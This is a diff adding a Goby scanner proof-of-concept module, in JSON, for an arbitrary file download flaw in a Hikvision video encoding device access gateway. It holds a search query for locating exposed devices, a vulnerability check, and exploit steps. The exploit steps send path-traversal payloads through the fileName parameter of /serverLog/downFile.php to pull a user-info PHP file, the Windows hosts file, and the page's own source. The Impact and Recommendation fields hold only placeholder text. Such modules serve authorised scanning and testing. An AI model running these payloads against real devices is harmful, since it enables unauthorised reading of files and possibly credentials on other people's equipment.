@@ -1,0 +1,78 @@
+{
+      "Name": "HIKVISION 视频编码设备接入网关 任意文件下载",
+      "Level": "1",
+      "Tags": [
+            "任意文件下载"
+      ],
+      "GobyQuery": "(app=\"Hikvision-Video-coding-device-access-gateway\" || title=\"视频编码设备接入网关\")",
+      "Description": "海康威视视频接入网关系统在页面/serverLog/downFile.php的参数fileName存在任意文件下载漏洞\n\n访问 http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php 下载文件",
+      "Product": "HIKVISION 视频编码设备接入网关",
+      "Homepage": "https://www.hikvision.com/cn/",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Filename",
+			"type": "select",
+			"value": "../web/html/data/saveUserInfo.php,../../../../../../WINDOWS/system32/drivers/etc/hosts,../web/html/serverLog/downFile.php",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "$file_name=",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/serverLog/downFile.php?fileName={{{Filename}}}",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-02-06 14:59:46",
+      "GobyVersion": "1.8.237"
+}
